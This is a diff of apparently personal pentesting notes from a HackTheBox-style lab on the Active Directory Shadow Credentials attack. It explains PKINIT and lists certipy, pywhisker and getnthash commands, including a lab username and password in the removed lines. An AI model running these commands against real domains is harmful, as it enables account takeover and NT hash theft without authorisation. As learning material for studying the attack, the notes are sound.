@@ -1,23 +1,30 @@
-#lateral_movement 
+#lateral_movement #PrivEsc 
 
-## for ESC9
-Prerequisites
-1. The target Domain Functional Level must be **Windows Server 2016** or above.
-2. The target domain must have at least one Domain Controller running Windows Server 2016 or above.
-3. The Domain Controller to use during the attack must have its own certificate and keys (this means either the organization must have AD CS, or a PKI, a CA or something alike).
-4. The attacker must have control over an account able to write the `msDs-KeyCredentialLink` attribute of the target user or computer account.
+PKINIT = an extension to Kerberos
+PKINIT = **Kerberos login using certificates instead of passwords**.
+Instead of password-derived keys, the client authenticates with a **certificate + private key**.
 
-### do it all in one command with `certipy`
-```bash
-certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.10.11.69
+>PKINIT is a asymmetric key (public key) approach. The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client’s public key. The KDC also has a public-private key pair, allowing for the exchange of a session key
 
-```
 ---
+A **Shadow Credential** attack abuses PKINIT.
+In AD, every account that can do **Kerberos authentication with certificates** has a `msDS-KeyCredentialLink` attribute.
 
+If an attacker can write to this attribute (via misconfigured ACLs / GenericWrite / GenericAll rights), they can add their own **malicious key pair**, Then they can generate a fake certificate corresponding to their private key.
+Using PKINIT, they authenticate as that user (even a Domain Admin) **without knowing their password or NT hash**.
 
-basically it allow us to modify the `msDS-KeyCredentialLink` to add shadow credentials
+## attack flow:
+1. User requests a TGT with their certificate (AS-REQ with PA-PK-AS-REQ). (AFTER INJECTING THE `msDS-KeyCredentialLink` )
+2. KDC Looks at the target account’s `msDS-KeyCredentialLink` and finds the public key you injected and uses it to **verify your signature** (not decrypt anything with a password key).
+3. If valid, DC issues a TGT **without needing the password**. (proof you own the private key)
+---
+# Exploitation
+
+basically it allow us to modify the `msDS-KeyCredentialLink` to add our forged private,public key pair and outputs a certificate
 ```bash
-pywhisker.py -d "<DOMAIN" -u "<USER>" -p "<PASSWORD>" --target "winrm_svc" --action "add"
+pywhisker.py -d "<DOMAIN>" -u "<USER>" -p "<PASSWORD>" --target "winrm_svc" --action "add"
+
+# This adds your malicious public key to the user’s msDS-KeyCredentialLink and You now have a private key + certificate that AD trusts for that user.
 
 ```
 
@@ -46,3 +53,4 @@ python3 getnthash.py -key 159bb5340c836973dd34c732c9f1efe0e6a98771ef00bdf0918d51
 ```
 
 
+[ref](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
